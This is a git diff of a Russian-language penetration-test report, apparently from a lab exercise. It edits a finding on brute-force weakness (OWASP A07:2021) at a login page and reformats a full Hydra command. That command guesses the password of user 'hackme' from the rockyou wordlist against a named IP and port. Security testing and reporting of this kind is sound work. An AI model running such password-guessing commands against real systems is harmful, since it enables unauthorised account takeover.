@@ -185,7 +185,7 @@ $ dirsearch -u http://92.51.39.105:7788
 
 </details>
 
-3. **Уязвимость к атакам BruteForce ([A07:2021-Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/))
+3. **Уязвимость к атакам BruteForce** ([A07:2021-Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/))
    
 **Страница:**`http://92.51.39.106:8050/users/login.php`\
 **Критичность:** Средняя\
@@ -206,7 +206,9 @@ $ dirsearch -u http://92.51.39.105:7788
 
 Используем инструмент Hydra для подбора пароля пользователя `hackme`:
 
-`hydra -l hackme -P "/home/kali/Downloads/rockyou.txt" -s 8050 92.51.39.106 http-post-form "/users/login.php:username=hackme&password=^PASS^:F=The username/password combination you have entered is invalid" -f`
+```sh
+hydra -l hackme -P "/home/kali/Downloads/rockyou.txt" -s 8050 92.51.39.106 http-post-form "/users/login.php:username=hackme&password=^PASS^:F=The username/password combination you have entered is invalid" -f
+```
 
 Спустя некоторое время получаем валидную пару логин/пароль:
 
